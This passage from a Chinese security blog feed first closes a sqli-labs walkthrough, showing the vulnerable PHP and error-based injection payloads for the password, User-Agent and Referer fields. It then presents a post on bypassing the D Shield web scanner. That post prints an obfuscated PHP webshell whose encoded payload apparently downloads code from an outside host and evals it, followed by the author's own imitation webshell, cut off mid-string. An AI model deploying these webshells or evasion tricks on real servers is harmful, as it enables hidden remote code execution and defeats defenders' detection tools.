.$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else      {        echo &#39;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;        //echo &quot;Bug off you Silly Dumb hacker&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;      }}?&gt;&lt;/font&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>从代码中可以看到对uname做了很好的过滤，单是对passwd没有做好对应的过滤以至于可以被人从passwd下手注入。</p><p><img src="https://s2.ax1x.com/2019/01/14/FxU1fO.md.png" alt="FxU1fO.md.png"></p><p>在passwd注入语句：</p><pre><code>admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) #</code></pre><p><img src="https://s2.ax1x.com/2019/01/14/FxUG1e.md.png" alt="FxUG1e.md.png"></p><p>第十八关：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-18 Header Injection- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&quot;&gt;&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;&lt;!--Form to post the contents --&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;  &lt;div&gt; Password : &amp;nbsp; &amp;nbsp;    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)    {    if(!empty($value)) /*判断变量值是否为空*/        {        // truncation (see comments)        $value = substr($value,0,20); /*从0的位置开始读取，长度为20*/        }        // Stripslashes if magic quotes enabled        if (get_magic_quotes_gpc())  /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &#39; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&#39;s 被一个反斜杠自动转义。*/            {            $value = stripslashes($value); /*去除单个反斜线，如果有两个反斜线则被替换为一个反斜线*/            }        // Quote if not a number        if (!ctype_digit($value)) /*纯数字检测*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value); /*取整数的值*/        }    return $value;    }    $uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;]; /*获取来访者的user-agent*/    $IP = $_SERVER[&#39;REMOTE_ADDR&#39;]; /*浏览当前页面用户的IP*/    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your IP ADDRESS is: &#39; .$IP;    echo &quot;&lt;br&gt;&quot;;    //echo &#39;Your User Agent is: &#39; .$uagent;// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*判断变量不为空并且值不为NULL*/    {    $uname = check_input($_POST[&#39;uname&#39;]); /*检测uname*/    $passwd = check_input($_POST[&#39;passwd&#39;]); /*检测passwd*/    echo &#39;Your Your User name:&#39;. $uname;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your Password:&#39;. $passwd;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your User Agent String:&#39;. $uagent;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your User Agent String:&#39;. $IP;    //logging the connection parameters to a file for analysis.        $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;User Agent:&#39;.$uname.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;    $result1 = mysql_query($sql);    $row1 = mysql_fetch_array($result1);        if($row1)            {            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;            $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; /*向数据库插入数据，记录user-agent,IP，uname*/            mysql_query($insert);            echo &#39;Your IP ADDRESS is: &#39; .$IP;            echo &quot;&lt;/font&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;                        echo &#39;Your User Agent is: &#39; .$uagent;            echo &quot;&lt;/font&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            print_r(mysql_error());                        echo &quot;&lt;br&gt;&lt;br&gt;&quot;;            echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;            }        else            {            echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;            //echo &quot;Try again looser&quot;;            print_r(mysql_error());            echo &quot;&lt;/br&gt;&quot;;                        echo &quot;&lt;/br&gt;&quot;;            echo &#39;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#39;;                echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/font&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>对uname和passwd做了严格的过滤，但是由于将浏览当前页面的IP，user-agent插入数据库中，user-agent头没有做好对应的过滤，引发注入</p><p><img src="https://s2.ax1x.com/2019/01/14/FxUwAP.png" alt="FxUwAP.png"></p><p><img src="https://s2.ax1x.com/2019/01/14/FxUBh8.png" alt="FxUBh8.png"></p><p>第十九关</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-19 Header Injection- Referer- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&quot;&gt;&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;&lt;!--Form to post the contents --&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;  &lt;div&gt; Password : &amp;nbsp; &amp;nbsp;    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)    {    if(!empty($value)) /*判断变量的值是否为空*/        {        // truncation (see comments)        $value = substr($value,0,20); /*从0的位置开始读取，长度为20*/        }        // Stripslashes if magic quotes enabled        if (get_magic_quotes_gpc())            {            $value = stripslashes($value); /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &#39; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&#39;s 被一个反斜杠自动转义。*/            }        // Quote if not a number        if (!ctype_digit($value)) /*检测字符串是否为数字*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value);        }    return $value;    }    $uagent = $_SERVER[&#39;HTTP_REFERER&#39;]; /*获取浏览器当前页面的referer头*/    $IP = $_SERVER[&#39;REMOTE_ADDR&#39;]; /*获取浏览当前页面的IP*/    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your IP ADDRESS is: &#39; .$IP;    echo &quot;&lt;br&gt;&quot;;    //echo &#39;Your User Agent is: &#39; .$uagent;// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*检查变量是否不为空而且不是null*/    {    $uname = check_input($_POST[&#39;uname&#39;]); /*调用check_input函数检查*/    $passwd = check_input($_POST[&#39;passwd&#39;]); /*调用check_input函数检查*/    /*    echo &#39;Your Your User name:&#39;. $uname;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your Password:&#39;. $passwd;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your User Agent String:&#39;. $uagent;    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your User Agent String:&#39;. $IP;    */    //logging the connection parameters to a file for analysis.        $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;Referer:&#39;.$uname.&quot;\n&quot;);    fclose($fp);    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;    $result1 = mysql_query($sql);    $row1 = mysql_fetch_array($result1);        if($row1)            {            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;            $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;; /*将数据插入数据库，引发注入*/            mysql_query($insert);            //echo &#39;Your IP ADDRESS is: &#39; .$IP;            echo &quot;&lt;/font&gt;&quot;;            //echo &quot;&lt;br&gt;&quot;;            echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;                        echo &#39;Your Referer is: &#39; .$uagent;            echo &quot;&lt;/font&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            print_r(mysql_error());                        echo &quot;&lt;br&gt;&lt;br&gt;&quot;;            echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;            }        else            {            echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;            //echo &quot;Try again looser&quot;;            print_r(mysql_error());            echo &quot;&lt;/br&gt;&quot;;                        echo &quot;&lt;/br&gt;&quot;;            echo &#39;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#39;;                echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/font&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>对uname和passwd做了严格的过滤，没对要插入数据库的referer做过滤，导致注入</p><p><img src="https://s2.ax1x.com/2019/01/14/FxUr9S.md.png" alt="FxUr9S.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass D shield</title>
      <link href="/posts/cde0d7e7.html"/>
      <url>/posts/cde0d7e7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天学了bypass D盾的一些知识，现在总一个总结。<br><img src="http://p3.pstatp.com/large/6159000260c5ea3ec1a4" alt="6159000260c5ea3ec1a4"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们来看一个大马，来自t00ls的大马。这个大马比较有趣</p><pre><code>&lt;?php//密码 Silic //base64解密自己修改远程读取 或者其他function MonkeySun(){    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;); /*两开花替换为空*/}$s=&quot;__JHMgPS__说到大马，我就想起了西游记里的白龙马。__B0cmlt__中美合拍的西游记即将正式开机，我继续扮演美猴王孙悟空__KHN1YnN0__我会用美猴王艺术形象努力创造一个正能量的形象__cihmaWx&quot;;$k=&quot;lX2dldF9jb__文体两开花，弘扬中华文化，希望大家能多多关注__250ZW50cygiaHR0cDovL3BqcnhuNjI4dy5ia3QuY2xvdWRkbi5jb20vZnVjay5naWYiKSwxOTA3MSkpOwpldmFsKCRzKTs=&quot;;$cre =MonkeySun();$str = strrev(&#39;EcAlpEr_RtS&#39;); /*反转字符串 str_replace()*/$ba64 = strrev(&#39;eDoCEd_46EsAb&#39;); /*反转字符串 base64_decode() */$ojbk=$cre(&#39;&#39;, $ba64($str(&quot;章口就莱&quot;, &quot;&quot;, $s.$k)));$ojbk();?&gt;</code></pre><p>这个大马成功过了D盾，而且思路还骚的一批。先打乱各种函数和webshell的payload，然后通过文字符串替换和字符串反转，实现eval()解码base64编码的webshell</p><p><img src="https://s2.ax1x.com/2019/01/13/FxC3D0.png" alt="FxC3D0.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxC5rt.png" alt="FxC5rt.png"></p><p>然后得到的思路是</p><pre><code>1.扰乱原来的函数2.在eval中重组</code></pre><p>模仿的一个例子：</p><pre><code>&lt;?phpfunction gg(){    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;); /*两开花替换为空后，create_function()这个函数拼接了起来，函数的使用方法参考：http://php.net/manual/en/function.create-function.php*/}$a=&quot;J卢本伟牛逼H卢本伟牛逼B卢本伟牛逼h卢本伟牛逼c卢本伟牛逼3卢本伟牛逼N卢本伟牛逼3卢本伟牛逼b卢本伟牛逼3卢本伟牛逼J卢本伟牛逼k卢本伟牛逼P卢本伟牛逼S卢本伟牛逼d卢本伟牛逼k卢本伟牛逼b卢本伟牛逼n卢本伟牛逼h卢本伟牛逼z卢本伟牛逼J卢本伟牛逼z卢本伟牛逼s卢本伟牛逼v卢本伟牛逼L卢本伟牛逼+卢本伟牛逼e卢本伟牛逼Z卢本伟牛逼u卢本伟牛逼+卢本伟牛逼W卢本伟牛逼9卢本伟牛逼l卢本伟牛逼e卢本伟牛逼W卢本伟牛逼v卢本伟牛逼h卢本伟牛逼u卢本伟牛逼e卢本伟牛逼g卢本伟牛逼g卢本伟牛逼S卢本伟牛逼j卢本伟牛逼m卢本伟牛逼l卢本伟牛逼K卢本伟牛逼/卢本伟牛逼m卢本伟牛逼j卢本伟牛逼I卢本伟牛逼H卢本伟牛逼o卢本伟牛逼j卢本伟牛逼5卢本伟牛逼z卢本伟牛逼l卢本伟牛逼i卢本伟牛逼I卢本伟牛逼A卢本伟牛逼p卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼v卢本伟牛逼L卢本伟牛逼y卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼3卢本伟牛逼l卢本伟牛逼i卢本伟牛逼p卢本伟牛逼/卢本伟牛逼o卢本伟牛逼g卢本伟牛逼7卢本伟牛逼3卢本伟牛逼n卢本伟牛逼q卢本伟牛逼I卢本伟牛逼v卢本伟牛逼l卢本伟牛逼u卢本伟牛逼o卢本伟牛逼8卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼v卢本伟牛逼L卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼9卢本伟牛逼I卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼I卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼p卢本伟牛逼z卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼N卢本伟牛逼z卢本伟牛逼a卢本伟牛逼W卢本伟牛逼9卢本伟牛逼u卢本伟牛逼X卢本伟牛逼3卢本伟牛逼N卢本伟牛逼0卢本伟牛逼Y卢本伟牛逼X卢本伟牛逼J卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼p卢本伟牛逼p卢本伟牛逼Z卢本伟牛逼i卢本伟牛逼h卢本伟牛逼l卢本伟牛逼b卢本伟牛逼X卢本伟牛逼B卢本伟牛逼0卢本伟牛逼e卢本伟牛逼S卢本伟牛逼g卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼S卢本伟牛逼k卢本伟牛逼p卢本伟牛逼e卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼D卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼U卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼d卢本伟牛逼X卢本伟牛逼J卢本伟牛逼s卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼w卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼U卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼d卢本伟牛逼X卢本伟牛逼J卢本伟牛逼s卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼T卢本伟牛逼k卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼5卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼x卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼u卢本伟牛逼P卢本伟牛逼S卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼5卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼5卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼z卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼u卢本伟牛逼P卢本伟牛逼S卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼T卢本伟牛逼U卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼1卢本伟牛逼M卢本伟牛逼y卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼U卢本伟牛逼w卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼D卢本伟牛逼c卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼g卢本伟牛逼y卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼O卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼N卢本伟牛逼z卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛